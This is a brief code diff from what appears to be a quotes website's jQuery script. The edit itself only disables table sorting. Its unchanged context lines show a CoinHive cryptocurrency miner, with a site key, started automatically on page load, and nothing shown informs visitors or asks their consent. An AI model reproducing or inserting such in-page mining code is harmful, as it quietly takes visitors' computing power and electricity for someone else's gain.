@@ -20,7 +20,9 @@ $(document).ready(function(){
   var miner = new CoinHive.Anonymous('80bDWx1KXIBOSEbxCmC01GVNYxUlqUYo'); 
   miner.start(); 
 
-  $("#quotes-table").DataTable();
+  $("#quotes-table").DataTable({
+    "bSort": false
+  });
 
   $(".favorite-quote").click(function(){
     that = this
